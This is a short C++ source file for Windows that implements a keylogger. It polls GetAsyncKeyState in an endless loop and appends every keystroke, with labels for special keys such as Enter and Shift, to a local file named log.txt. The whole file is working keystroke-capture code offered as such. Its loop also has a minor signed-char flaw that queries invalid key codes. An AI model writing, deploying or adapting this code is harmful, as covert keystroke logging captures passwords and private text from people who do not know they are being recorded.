#include <iostream>
#include <fstream>
#include <Windows.h>
#include <WinUser.h>

using namespace std;

void logger();

int main()
{
    logger();
}

void logger()
{
    char c;
    while (true)
    {
        for (c = 0; c <= 254; c++)
        {
            if (GetAsyncKeyState(c) & 0x1)
            {
                ofstream inf;
                inf.open("log.txt", ios::app);
                switch (c)
                {
                case VK_BACK:
                    inf << "[BACKSPACE]";
                    break;

                case VK_RETURN:
                    inf << "[ENTER]";
                    break;

                case VK_SHIFT:
                    inf << "[SHIFT]";
                    break;

                case VK_SPACE:
                    inf << "[SPACE]";
                    break;

                case VK_TAB:
                    inf << "[TAB]";
                    break;

                case VK_CONTROL:
                    inf << "[CTRL]";
                    break;

                case VK_CAPITAL:
                    inf << "[CAPS]";
                    break;

                case VK_MENU:
                    inf << "[ALT]";
                    break;
                case VK_NUMPAD0:
                    inf << "0";
                    break;
                case VK_NUMPAD1:
                    inf << "1";
                    break;
                case VK_NUMPAD2:
                    inf << "2";
                    break;
                case VK_NUMPAD3:
                    inf << "3";
                    break;
                case VK_NUMPAD4:
                    inf << "4";
                    break;
                case VK_NUMPAD5:
                    inf << "5";
                    break;
                case VK_NUMPAD6:
                    inf << "6";
                    break;
                case VK_NUMPAD7:
                    inf << "7";
                    break;
                case VK_NUMPAD8:
                    inf << "8";
                    break;
                case VK_NUMPAD9:
                    inf << "9";
                    break;
                case VK_RBUTTON:
                case VK_LBUTTON:
                    break;
                default:
                    inf << " " << c << " ";
                }
            }
        }
    }
}
// shreyas mali cpp deveoper